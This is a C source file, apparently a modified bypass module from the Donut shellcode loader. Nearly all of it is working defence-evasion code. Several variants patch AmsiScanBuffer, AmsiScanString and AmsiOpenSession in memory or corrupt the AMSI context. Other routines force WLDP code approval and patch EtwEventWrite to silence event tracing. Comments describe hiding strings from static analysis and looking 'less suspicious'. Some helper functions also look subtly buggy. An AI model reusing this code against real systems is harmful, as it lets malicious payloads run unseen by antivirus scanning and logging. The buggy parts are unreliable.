/**
  BSD 3-Clause License

  Copyright (c) 2019, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "bypass.h"
#if defined(BYPASS_AMSI_E)
#define NtCurrentPeb()            (NtCurrentTeb()->ProcessEnvironmentBlock)
BOOL UnicodeStringToAnsiString(UNICODE_STRING* unicodeStr, char** ansiStr, PDONUT_INSTANCE inst) {
    int bufferSize = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        return FALSE;
    }
    *ansiStr = inst->api.VirtualAlloc(NULL, bufferSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (*ansiStr == NULL) {
        return STATUS_NO_MEMORY;
    }

    int result = inst->api.WideCharToMultiByte(CP_UTF8, 0, unicodeStr->Buffer, unicodeStr->Length / 2, *ansiStr, bufferSize, NULL, NULL);
    if (result == 0) {
        inst->api.VirtualFree(*ansiStr, bufferSize + 1, MEM_RELEASE | MEM_DECOMMIT);
        return FALSE;
    }

    (*ansiStr)[bufferSize] = '\0';
    
    return FALSE;
}

int CompareDllPrefix(const char* str1, const char* str2) {
    while (*str1 != '\0' && *str2 != '\0') {
        if (*str1 == '.' && *(str1+1) == 'd' && *(str1+2) == 'l' && *(str1+3) == 'l') {
            return 0;
        }
        if (*str2 == '.' && *(str2+1) == 'd' && *(str2+2) == 'l' && *(str2+3) == 'l') {
            return 0;
        }
        if (*str1 != *str2) {
            return 0;
        }
        str1++;
        str2++;
    }
    return 1;
}


HMODULE FindModule(const char* moduleName, PDONUT_INSTANCE inst) {
    // Get PEB address using NtCurrentPeb
    PPEB peb = NtCurrentPeb();
    PEB_LDR_DATA* ldrData = peb->Ldr;
    LIST_ENTRY* head = &ldrData->InLoadOrderModuleList;
    LIST_ENTRY* current = head->Flink;

    // Iterate over the linked list of loaded modules
    while (current != head) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        char* ansiStr;
        UnicodeStringToAnsiString(&entry->BaseDllName, &ansiStr, inst);
        int eq = CompareDllPrefix(ansiStr, moduleName);
        if (entry && CompareDllPrefix(ansiStr, moduleName)) {
          DPRINT("Found Amsi.dll at: %p", entry->DllBase);
          return (HMODULE)entry->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}

void* FindExportTable(HMODULE hModule) {
    // Uzyskaj nagłówek DOS
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    
    // Sprawdzenie, czy nagłówek DOS jest poprawny
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return;
    }

    // Przejdź do nagłówka NT
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    
    // Sprawdzenie, czy nagłówek NT jest poprawny
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return;
    }

    // Znajdź adres tabeli eksportów
    DWORD exportTableRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportTableRVA == 0) {
        return;
    }

    // Oblicz adres tabeli eksportów w pamięci
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + exportTableRVA);
    return exportDir;
}

HRESULT WINAPI AmsiScanBufferStub(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{    
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

int AmsiScanBufferStubEnd(int a, int b) {
    return a * b;
}

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
  xGetLibAddress(inst, inst->amsi);
  HMODULE amsiDll = FindModule(inst->amsi, inst);  // Find the AMSI library
  if (amsiDll == NULL) {
      return FALSE;
  }
  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(amsiDll);
  if (!exportDir) {
    return FALSE;
  }

  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfFunctions);
  DWORD* pFunctionNames = (DWORD*)((BYTE*)amsiDll + exportDir->AddressOfNames);
  WORD* pNameOrdinals = (WORD*)((BYTE*)amsiDll + exportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
    char* funcName = (char*)((BYTE*)amsiDll + pFunctionNames[i]);
    if (compare(funcName, inst->amsiScanBuf)) {
        // Znaleziono nazwę funkcji, zwróć jej adres
        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
        void* functionAddr = (void*)((BYTE*)amsiDll + functionRVA);
        DPRINT("Fuzzing AmsiScanBuffer at: %p", functionAddr);
        DWORD len = (ULONG_PTR)AmsiScanBufferStubEnd -
        (ULONG_PTR)AmsiScanBufferStub;
        DWORD op = 0;
        DWORD t = 0;
        if(!inst->api.VirtualProtect(
          functionAddr, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
          
        DPRINT("Overwriting AmsiScanBuffer");
        // over write with virtual address of stub
        Memcpy(functionAddr, ADR(PCHAR, AmsiScanBufferStub), len);   
        // set memory back to original protection
        inst->api.VirtualProtect(functionAddr, len, op, &t);
        return TRUE;
    }
  }
  
  DPRINT("Function not found.");
  return FALSE;
}

#elif defined(BYPASS_AMSI_A)
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
  BOOL ret = DisableAMSI_A(inst) &&
  DisableAMSI_B(inst) &&
  DisableAMSI_C(inst) &&
  DisableAMSI_D(inst);
  return ret;
}

BOOL DisableAMSI_A(PDONUT_INSTANCE inst) {
  HMODULE dll;
  DWORD   t;
  LPVOID  ptr;

  dll = xGetLibAddress(inst, inst->amsi);
  if(dll == NULL) return TRUE;
  DPRINT("Get dll AMSI");
  
  ptr = xGetProcAddress(inst, dll, inst->amsiOpenSess, 0);
  if(ptr == NULL) return FALSE;
  DPRINT("Get AMSIOpenSess");
  
	char Patch[100];
  Memset(&Patch, 0, 100);
  Patch[0] = 0x48;
  Patch[1] = 0x31;
  Patch[2] = 0xc9; // xor rcx rcx

	DWORD OldProtect = 0;
	DWORD memPage = 3;
  DPRINT("VirtualProtect 1 0x%016x", ptr);
	if(!inst->api.VirtualProtect(ptr, memPage, PAGE_EXECUTE_READWRITE, &OldProtect)) return FALSE;
  DPRINT("memcpy");
  Memcpy(ptr, Patch, 3);
  DPRINT("VirtualProtect 2");
	if(!inst->api.VirtualProtect(ptr, memPage, OldProtect, &t)) return FALSE;
  DPRINT("Method A return");
	return TRUE;
}

BOOL DisableAMSI_B(PDONUT_INSTANCE inst) {
  HMODULE dll;
  DWORD   t;
  LPVOID  ptr;
  DWORD OldProtect = 0;
	DWORD memPage = 3;

  char Patch[100];
  Memset(&Patch, 0, 100);
  Patch[0] = 0xb8;
  Patch[1] = 0x34;
  Patch[2] = 0x12;
  Patch[3] = 0x07;
  Patch[5] = 0x80;
  Patch[6] = 0x66;
  Patch[7] = 0xb8;
  Patch[8] = 0x32;
  Patch[9] = 0x00;
  Patch[10] = 0xb0;
  Patch[11] = 0x57;
  Patch[12] = 0xc3;

  DWORD offset = 0x83;

  dll = xGetLibAddress(inst, inst->amsi);
  if(dll == NULL) return TRUE;
  DPRINT("Get dll AMSI");
  
  ptr = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
  if(ptr == NULL) return FALSE;
  DPRINT("Get AMSIScanBuffer");

  if(!inst->api.VirtualProtect(ptr, memPage, PAGE_EXECUTE_READWRITE, &OldProtect)) return FALSE;
  DPRINT("Memcpy 1");
  Memcpy(ptr, Patch, 12);
  DPRINT("Memcpy 2");
  Memcpy((LPVOID)((char*)ptr + offset), "\x74", 1);
	if(!inst->api.VirtualProtect(ptr, memPage, OldProtect, &t)) return FALSE;
	DPRINT("Method B return");
  return TRUE;
}

BOOL DisableAMSI_C(PDONUT_INSTANCE inst) {
    LPVOID                   clr;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;
    
    // get address of CLR.dll. if unable, this
    // probably isn't a dotnet assembly being loaded
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) return FALSE;
    
    dos = (PIMAGE_DOS_HEADER)clr;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
      nt->FileHeader.SizeOfOptionalHeader);
             
    // scan all writeable segments while disabled == FALSE
    for(i = 0; 
        i < nt->FileHeader.NumberOfSections && !disabled; 
        i++) 
    {
      // if this section is writeable, assume it's data
      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        // scan section for pointers to the heap
        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
           
        for(j = 0; 
            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
            j += sizeof(ULONG_PTR)) 
        {
          // get pointer
          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
          // query if the pointer
          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
          if(res != sizeof(mbi)) continue;
          
          // if it's a pointer to heap or stack
          if ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_PRIVATE   ) && 
              (mbi.Protect == PAGE_READWRITE))
          {
            ctx = (_PHAMSICONTEXT)ptr;
            // check if it contains the signature 
            if(ctx->Signature == *(PDWORD*)inst->amsi) {
              // corrupt it
              ctx->Signature = ctx->Signature +2;
              disabled = TRUE;
              break;
            }
          }
        }
      }
    }
    DPRINT("Method C return %i", disabled);
    return disabled;
}

BOOL Path_CLR(MEMORY_BASIC_INFORMATION* region, PDONUT_INSTANCE inst) {
  for (int j = 0; j < region->RegionSize - sizeof(unsigned char*); j++) {
    unsigned char* current = ((unsigned char*)region->BaseAddress) + j;

    //See if the current pointer points to the string "AmsiScanBuffer." In SpecterInsight
    //the Parameters->AMSISCANBUFFER is a value that is decoded at runtime in order to
    //avoid static analysis
    BOOL found = TRUE;
    for (int k = 0; k < sizeof(inst->amsiScanBuf); k++) {
        if (current[k] != inst->amsiScanBuf[k]) {
            found = FALSE;
            break;
        }
    }

    if (found) {
        //We found the string. Now we need to modify permissions, if necessary
        //to allow us to overwrite it
        DWORD original = 0;
        if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
            inst->api.VirtualProtect(region->BaseAddress, region->AllocationBase, PAGE_EXECUTE_READWRITE, &original);
        }

        //Overwrite the strings with zero. This will now be an "empty" string.
        for (int m = 0; m < sizeof(inst->amsiScanBuf); m++) {
            current[m] = 0;
        }

        //Restore permissions if necessary so it looks less suspicious.
        if ((region->Protect & PAGE_READWRITE) != PAGE_READWRITE) {
            inst->api.VirtualProtect(region->BaseAddress, region->RegionSize, region->Protect, &original);
        }
        return TRUE;
    }
    return FALSE;
  }
}

BOOL DisableAMSI_D(PDONUT_INSTANCE inst) {
  HANDLE hProcess = inst->api.GetCurrentProcess();

  //Load system info to identify allocated memory regions
  SYSTEM_INFO sysInfo;
  inst->api.GetSystemInfo(&sysInfo);
  
  //Generate a list of memory regions to scan
  unsigned char* pAddress = 0;// (unsigned char*)sysInfo.lpMinimumApplicationAddress;
  MEMORY_BASIC_INFORMATION memInfo;
  char path[MAX_PATH];
  int count = 0;
  LPVOID clr = inst->api.GetModuleHandleA(inst->clr);
  //Query memory region information
  inst->api.VirtualQuery(clr, &memInfo, sizeof(memInfo));
  if(Path_CLR(&memInfo, inst)) {
          count++;
  }

  if (count > 0) {
      return TRUE;
  } else {
      return FALSE;
  }
}

BOOL CheckStr(const char* str, int length) {
    if (length < 7) {
        return FALSE;
    }

    //Why the weird check? I'm trying not to store the string "clr.dll" in the
    //binary without being encoded
    int offset = length - 1;
    if (str[offset] == 'l' || str[offset] == 'L') {
        offset = offset - 1;
        if (str[offset] == 'l' || str[offset] == 'L') {
            offset = offset - 1;
            if (str[offset] == 'd' || str[offset] == 'D') {
                offset = offset - 1;
                if (str[offset] == '.') {
                    offset = offset - 1;
                    if (str[offset] == 'r' || str[offset] == 'R') {
                        offset = offset - 1;
                        if (str[offset] == 'l' || str[offset] == 'L') {
                            offset = offset - 1;
                            if (str[offset] == 'c' || str[offset] == 'C') {
                                return TRUE;
                            }
                        }
                    }
                }
            }
        }
    }

    return FALSE;
}

#elif defined(BYPASS_AMSI_B)
// fake function that always returns S_OK and AMSI_RESULT_CLEAN
HRESULT WINAPI AmsiScanBufferStub(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{    
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// This function is never called. It's simply used to calculate
// the length of AmsiScanBufferStub above.
//
// The reason it performs a multiplication is because MSVC can identify
// functions that perform the same operation and eliminate them
// from the compiled code. Null subroutines are eliminated, so the body of
// function needs to do something.

int AmsiScanBufferStubEnd(int a, int b) {
    return a * b;
}

// fake function that always returns S_OK and AMSI_RESULT_CLEAN
HRESULT WINAPI AmsiScanStringStub(
    HAMSICONTEXT amsiContext,
    LPCWSTR      string,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT  *result)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

int AmsiScanStringStubEnd(int a, int b) {
    return a + b;
}

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE dll;
    DWORD   len, op, t;
    LPVOID  cs;

    // try load amsi. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)AmsiScanBufferStubEnd -
          (ULONG_PTR)AmsiScanBufferStub;
    
    DPRINT("Length of AmsiScanBufferStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    DPRINT("Overwriting AmsiScanBuffer");
    // over write with virtual address of stub
    Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
    // set memory back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
  
    // resolve address of AmsiScanString. if not found,
    // return FALSE because it should exist ...
    cs = xGetProcAddress(inst, dll, inst->amsiScanStr, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)AmsiScanStringStubEnd -
          (ULONG_PTR)AmsiScanStringStub;
     
    DPRINT("Length of AmsiScanStringStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    DPRINT("Overwriting AmsiScanString");
    // over write with virtual address of stub
    Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
    // set memory back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}

#elif defined(BYPASS_AMSI_C)
BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    HMODULE        dll;
    PBYTE          cs;
    DWORD          i, op, t;
    BOOL           disabled = FALSE;
    PDWORD         Signature;
    
    // try load amsi. if unable to load, assume
    // it doesn't exist and return TRUE to indicate
    // it's okay to continue.
    dll = xGetLibAddress(inst, inst->amsi);
    if(dll == NULL) return TRUE;
    
    // resolve address of AmsiScanBuffer. if unable, return
    // FALSE because it should exist.
    cs = (PBYTE)xGetProcAddress(inst, dll, inst->amsiScanBuf, 0);
    if(cs == NULL) return FALSE;
    
    // scan for signature
    for(i=0;;i++) {
      Signature = (PDWORD)&cs[i];
      // is it "AMSI"?
      if(*Signature == *(PDWORD)inst->amsi) {
        // set memory protection for write access
        inst->api.VirtualProtect(cs, sizeof(DWORD), 
          PAGE_EXECUTE_READWRITE, &op);
          
        // change signature
        *Signature++;
        
        // set memory back to original protection
        inst->api.VirtualProtect(cs, sizeof(DWORD), op, &t);
        disabled = TRUE;
        break;
      }
    }
    return disabled;
}

#elif defined(BYPASS_AMSI_D)
// Attempt to find AMSI context in .data section of CLR.dll
// Could also scan PEB.ProcessHeap for this..
// Disabling AMSI via AMSI context is based on idea by Matt Graeber
// https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9

BOOL DisableAMSI(PDONUT_INSTANCE inst) {
    LPVOID                   clr;
    BOOL                     disabled = FALSE;
    PIMAGE_DOS_HEADER        dos;
    PIMAGE_NT_HEADERS        nt;
    PIMAGE_SECTION_HEADER    sh;
    DWORD                    i, j, res;
    PBYTE                    ds;
    MEMORY_BASIC_INFORMATION mbi;
    _PHAMSICONTEXT           ctx;
    
    // get address of CLR.dll. if unable, this
    // probably isn't a dotnet assembly being loaded
    clr = inst->api.GetModuleHandleA(inst->clr);
    if(clr == NULL) return FALSE;
    
    dos = (PIMAGE_DOS_HEADER)clr;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, clr, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
      nt->FileHeader.SizeOfOptionalHeader);
             
    // scan all writeable segments while disabled == FALSE
    for(i = 0; 
        i < nt->FileHeader.NumberOfSections && !disabled; 
        i++) 
    {
      // if this section is writeable, assume it's data
      if (sh[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
        // scan section for pointers to the heap
        ds = RVA2VA (PBYTE, clr, sh[i].VirtualAddress);
           
        for(j = 0; 
            j < sh[i].Misc.VirtualSize - sizeof(ULONG_PTR); 
            j += sizeof(ULONG_PTR)) 
        {
          // get pointer
          ULONG_PTR ptr = *(ULONG_PTR*)&ds[j];
          // query if the pointer
          res = inst->api.VirtualQuery((LPVOID)ptr, &mbi, sizeof(mbi));
          if(res != sizeof(mbi)) continue;
          
          // if it's a pointer to heap or stack
          if ((mbi.State   == MEM_COMMIT    ) &&
              (mbi.Type    == MEM_PRIVATE   ) && 
              (mbi.Protect == PAGE_READWRITE))
          {
            ctx = (_PHAMSICONTEXT)ptr;
            // check if it contains the signature 
            if(ctx->Signature == *(PDWORD*)inst->amsi) {
              // corrupt it
              ctx->Signature++;
              disabled = TRUE;
              break;
            }
          }
        }
      }
    }
    return disabled;
}
#endif

#if defined(BYPASS_WLDP_A)
// This is where you may define your own WLDP bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_WLDP_A defined.

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    return TRUE;
}

#elif defined(BYPASS_WLDP_B)

// fake function that always returns S_OK and isApproved = TRUE
HRESULT WINAPI WldpIsClassInApprovedListStub(
    REFCLSID               classID,
    PWLDP_HOST_INFORMATION hostInformation,
    PBOOL                  isApproved,
    DWORD                  optionalFlags)
{
    *isApproved = TRUE;
    return S_OK;
}

// make sure prototype and code are different from other subroutines
// to avoid removal by MSVC
int WldpIsClassInApprovedListStubEnd(int a, int b) {
  return a - b;
}

// fake function that always returns S_OK
HRESULT WINAPI WldpQueryDynamicCodeTrustStub(
    HANDLE fileHandle,
    PVOID  baseImage,
    ULONG  ImageSize)
{
    return S_OK;
}

int WldpQueryDynamicCodeTrustStubEnd(int a, int b) {
  return a / b;
}

BOOL DisableWLDP(PDONUT_INSTANCE inst) {
    HMODULE wldp;
    DWORD   len, op, t;
    LPVOID  cs;
    
    // try load wldp. if unable, assume DLL doesn't exist
    // and return TRUE to indicate it's okay to continue
    wldp = xGetLibAddress(inst, inst->wldp);
    if(wldp == NULL) return TRUE;
    
    // resolve address of WldpQueryDynamicCodeTrust
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpQuery, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpQueryDynamicCodeTrustStubEnd -
          (ULONG_PTR)WldpQueryDynamicCodeTrustStub;
      
    DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    // resolve address of WldpIsClassInApprovedList
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, wldp, inst->wldpIsApproved, 0);
    if(cs == NULL) return FALSE;
    
    // calculate length of stub
    len = (ULONG_PTR)WldpIsClassInApprovedListStubEnd -
          (ULONG_PTR)WldpIsClassInApprovedListStub;
    
    DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
    
    // check for negative length. this would only happen when
    // compiler decides to re-order functions.
    if((int)len < 0) return FALSE;
    
    // make the memory writeable. return FALSE on error
    if(!inst->api.VirtualProtect(
      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
      
    // overwrite with virtual address of stub
    Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
    // set back to original protection
    inst->api.VirtualProtect(cs, len, op, &t);
    
    return TRUE;
}
#endif

#if defined(BYPASS_ETW_NONE)
BOOL DisableETW(PDONUT_INSTANCE inst) {
  return TRUE;
}

#elif defined(BYPASS_ETW_A)
// This is where you may define your own ETW bypass.
// To rebuild with your bypass, modify the makefile to add an option to build with BYPASS_ETW_A defined.
BOOL DisableETW(PDONUT_INSTANCE inst) {
  HMODULE ntdll = FindModule(inst->ntdll, inst);  // Find the AMSI library
  if (ntdll == NULL) {
      return FALSE;
  }
  PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)FindExportTable(ntdll);
  if (!exportDir) {
    return FALSE;
  }

  DWORD* pFunctionAddresses = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfFunctions);
  DWORD* pFunctionNames = (DWORD*)((BYTE*)ntdll + exportDir->AddressOfNames);
  WORD* pNameOrdinals = (WORD*)((BYTE*)ntdll + exportDir->AddressOfNameOrdinals);

  for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
    char* funcName = (char*)((BYTE*)ntdll + pFunctionNames[i]);
    if (compare(funcName, inst->etwEventWrite)) {
        DWORD functionRVA = pFunctionAddresses[pNameOrdinals[i]];
        void* functionAddr = (void*)((BYTE*)ntdll + functionRVA);
        DPRINT("Fuzzing etwEventWrite at: %p", functionAddr);
        DWORD op = 0;
        DWORD t = 0;

        #ifdef _WIN64
            // make the memory writeable. return FALSE on error
            if (!inst->api.VirtualProtect(
                functionAddr, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

            DPRINT("Overwriting EtwEventWrite");

            // over write with "ret"
            Memcpy(functionAddr, inst->etwRet64, 1);

            // set memory back to original protection
            inst->api.VirtualProtect(functionAddr, 1, op, &t);
        #else
            // make the memory writeable. return FALSE on error
            if (!inst->api.VirtualProtect(
                functionAddr, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

            DPRINT("Overwriting EtwEventWrite");

            // over write with "ret 14h"
            Memcpy(functionAddr, inst->etwRet32, 4);

            // set memory back to original protection
            inst->api.VirtualProtect(functionAddr, 4, op, &t);
        #endif
        return TRUE;
    }
  }
  
  DPRINT("Function not found.");
  return FALSE;
}

#elif defined(BYPASS_ETW_B)
BOOL DisableETW(PDONUT_INSTANCE inst) {
    HMODULE dll;
    DWORD   len, op, t;
    LPVOID  cs;

    // get a handle to ntdll.dll
    dll = xGetLibAddress(inst, inst->ntdll);

    // resolve address of EtwEventWrite
    // if not found, return FALSE because it should exist
    cs = xGetProcAddress(inst, dll, inst->etwEventWrite, 0);
    if (cs == NULL) return FALSE;

#ifdef _WIN64
    // make the memory writeable. return FALSE on error
    if (!inst->api.VirtualProtect(
        cs, 1, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

    DPRINT("Overwriting EtwEventWrite");

    // over write with "ret"
    Memcpy(cs, inst->etwRet64, 1);

    // set memory back to original protection
    inst->api.VirtualProtect(cs, 1, op, &t);
#else
    // make the memory writeable. return FALSE on error
    if (!inst->api.VirtualProtect(
        cs, 4, PAGE_EXECUTE_READWRITE, &op)) return FALSE;

    DPRINT("Overwriting EtwEventWrite");

    // over write with "ret 14h"
    Memcpy(cs, inst->etwRet32, 4);

    // set memory back to original protection
    inst->api.VirtualProtect(cs, 4, op, &t);
#endif

    return TRUE;

}

#endif